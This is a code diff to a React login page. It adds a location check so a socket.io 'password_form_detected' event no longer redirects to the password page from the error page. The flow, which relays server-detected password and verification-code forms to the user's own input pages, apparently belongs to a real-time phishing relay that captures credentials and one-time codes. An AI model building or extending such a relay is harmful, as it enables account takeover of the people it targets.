@@ -1,7 +1,7 @@
 import type { FC } from 'react';
 import { useState, useEffect, useRef } from 'react';
 import { io, Socket } from 'socket.io-client';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 
 import { Page } from '@/components/Page.tsx';
 import { sessionManager } from '@/helpers/sessionManager';
@@ -25,6 +25,7 @@ import { sessionManager } from '@/helpers/sessionManager';
  */
 export const IndexPage: FC = () => {
   const navigate = useNavigate();
+  const location = useLocation();
   const [isConnected, setIsConnected] = useState(false);
   const [sessionId, setSessionId] = useState<string>('');
   const [_loginStatus, setLoginStatus] = useState<string>('');
@@ -351,8 +352,13 @@ export const IndexPage: FC = () => {
         } else if (data.event === 'password_form_detected') {
           console.log('🔐 Password form detected, navigating to password page...');
           setLoginStatus('Password form detected - redirecting...');
-          // Navigate to password page
-          navigate(`/sign-in-password?sessionId=${encodeURIComponent(sessionId)}`);
+          // Only navigate if we're not already on the error page
+          if (location.pathname !== '/error') {
+            // Navigate to password page
+            navigate(`/sign-in-password?sessionId=${encodeURIComponent(sessionId)}`);
+          } else {
+            console.log('🚫 Already on error page, not redirecting to password page');
+          }
         } else if (data.event === 'verification_form_detected') {
           console.log('📱 Verification form detected, navigating to verification page...');
           setLoginStatus('Verification code form detected - redirecting...');
